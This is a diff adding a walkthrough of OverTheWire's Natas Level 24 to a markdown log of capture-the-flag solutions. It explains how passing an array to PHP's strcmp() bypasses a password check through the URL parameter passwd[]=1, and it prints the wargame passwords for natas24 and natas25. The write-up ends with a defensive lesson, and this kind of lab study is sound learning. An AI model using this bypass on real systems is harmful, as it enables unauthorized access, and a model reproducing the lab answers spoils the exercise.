@@ -2439,9 +2439,76 @@ Be careful when comparing strings to numbers in PHP — type juggling can break 
 
 ### Level 24
 
-- **Date**: 2026-04-05
+- **Date**: 2026-04-20
 - **URL**: `http://natas24.natas.labs.overthewire.org`
 - **Password**: `MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`
+- **Tools**: Web Browser
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>
+```
+
+Notice the use of `strcmp()`. `strcmp()` expects **strings**.
+If we pass an array to it, PHP raises a warning and the function returns `NULL`.
+And `!NULL` evaluates to `true` in `PHP`!
+
+So we can bypass the password check by passing an array instead of a string!
+
+To pass an array in the `passwd` parameter, we can use `[]` in the query string:
+```
+http://natas24.natas.labs.overthewire.org/?passwd[]=1
+```
+
+This will cause `$_REQUEST["passwd"]` to be an array instead of a string.
+
+When we submit this, we get the following warning and the credentials for natas25:
+```html
+<br />
+<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
+```
+
+And the password for natas25 is `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`.
+
+#### The Lesson
+
+Validate types and use `hash_equals()` for safe comparisons.
+
+### Level 25
+- **Date**: 2026-04-20
+- **URL**: `http://natas25.natas.labs.overthewire.org`
+- **Password**: `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`
 - **Tools**: Web Browser
 
 #### The Solution
